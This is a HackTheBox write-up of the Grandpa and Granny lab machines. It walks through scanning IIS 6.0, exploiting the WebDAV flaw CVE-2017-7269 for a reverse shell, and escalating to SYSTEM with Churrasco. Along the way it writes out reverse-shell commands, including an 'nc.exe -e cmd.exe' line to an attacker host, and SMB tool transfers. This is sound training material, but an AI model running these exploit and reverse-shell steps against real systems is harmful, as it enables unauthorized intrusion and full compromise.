# HackTheBox: Grandpa & Granny — Writeup

## 📊 Executive Summary

This writeup documents the exploitation and privilege escalation process for the **Grandpa** and **Granny** machines on HackTheBox. Both targets share an identical architecture, entry vector, and privilege escalation path.

The attack path consists of exploiting an outdated **Microsoft IIS 6.0** web server via a known **WebDAV** vulnerability (**CVE-2017-7269**) to gain initial access, followed by leveraging the **`SeImpersonatePrivilege`** token privilege using the **Churrasco** exploit on **Windows Server 2003** to achieve full administrative control (`nt authority\system`).

---

## 🔍 1. Reconnaissance & Enumeration

### Initial Port Scanning

An initial infrastructure scan was conducted to identify open ports and minimize network noise:

```bash
nmap -Pn -n -p- --open --min-rate 5000 <TARGET_IP>

```

* **Result:** Only **port 80** (HTTP) was found open.

### Service Enumeration

A targeted scan was executed on port 80 to extract service banners and identify potential vulnerabilities:

```bash
nmap -sCV -p80 --script=http-enum,http-methods,http-title <TARGET_IP>

```

* **Result:** The web server was identified as **Microsoft IIS 6.0**.

### WebDAV Verification

Given the legacy nature of IIS 6.0, the presence of the WebDAV extension was tested using Nmap's NSE scripts:

```bash
nmap -p80 --script=http-iis-webdav-vuln <TARGET_IP>

```

To manually verify that the `PROPFIND` method (indicative of WebDAV) was enabled, a custom request was sent via `curl`:

```bash
curl -X PROPFIND http://<TARGET_IP>/

```

The server responded positively, confirming that WebDAV was active and likely vulnerable to **CVE-2017-7269** (a buffer overflow vulnerability in the `ScStoragePathFromUrl` function).

---

## ⚡ 2. Weaponization & Initial Access

A modern, highly stable exploit implementation written in Rust was selected to leverage **CVE-2017-7269**.

### Compiling the Exploit (Attacker Machine)

The exploit repository was cloned and compiled into a release binary:

```bash
git clone https://github.com/nika0x38/CVE-2017-7269.git
cd CVE-2017-7269
cargo build --release

```

### Exploit Execution

A Netcat listener was established on the attacker machine to catch the reverse shell:

```bash
nc -lvnp <LPORT_1>

```

The compiled binary was executed against the target:

```bash
./target/release/CVE-2017-7269 --rhost <TARGET_IP> --rport 80 --lhost <ATTACKER_IP> --lport <LPORT_1>

```

Upon successful execution, a low-privilege reverse shell session was established.

---

## 🛡️ 3. Local Enumeration

After stabilizing the initial shell, a system assessment was performed to determine the current user context and available privileges:

```cmd
whoami

```

> **Current Context:** `nt authority\network service`

The token privileges were enumerated next:

```cmd
whoami /priv

```

* **Analysis:** The **`SeImpersonatePrivilege`** is present and enabled. This allows the process to impersonate a client after authentication, making the system highly susceptible to token-impersonation attacks.

To select the correct payload for the kernel architecture, system information was retrieved:

```cmd
systeminfo

```

> **Operating System:** **Windows Server 2003**.

Given the legacy operating system version, **Churrasco.exe** (a legacy token impersonation tool) was chosen as the optimal exploit vector to elevate privileges.

---

## 🚀 4. Privilege Escalation

### Staging the Binaries (Attacker Machine)

The `churrasco.exe` binary was downloaded from a trusted repository and renamed to `.txt` to prevent potential transfer stream corruption:

```bash
wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
mv churrasco.exe churrasco.txt

```

A Windows-compatible Netcat binary (`nc.exe`) was located on the attacker system and copied to the working directory:

```bash
locate nc.exe
cp /usr/share/windows-resources/binaries/nc.exe nc.exe

```

An SMB server was initialized using Impacket to host and serve the required binaries to the target:

```bash
sudo impacket-smbserver -smb2support share .

```

### Data Exfiltration & Setup (Target Machine)

On the target machine, the session was moved to a writable directory (`\Temp`), a dedicated working directory was created, and the staged tools were copied over via the SMB share:

```cmd
cd C:\WINDOWS\Temp
mkdir pwn
cd pwn

copy \\<ATTACKER_IP>\share\churrasco.txt churrasco.exe
copy \\<ATTACKER_IP>\share\nc.exe nc.exe

```

### Final Privilege Escalation Execution

A second Netcat listener was configured on the attacker machine to receive the high-privilege connection:

```bash
nc -lvnp <LPORT_2>

```

The `churrasco.exe` exploit was triggered, instructing it to run the local `nc.exe` binary and redirect a command prompt back to the newly established listener:

```cmd
churrasco.exe "nc.exe -e cmd.exe <ATTACKER_IP> <LPORT_2>"

```

Upon checking the second listener, the shell context was verified:

```cmd
whoami

```

> **Final Context:** `nt authority\system`

Full administrative compromise was successfully achieved. The `user.txt` and `root.txt` flags can now be retrieved from their respective administrator and user profile directories.

---

*Disclaimer: This writeup is intended for educational purposes and authorized penetration testing scenarios only.*
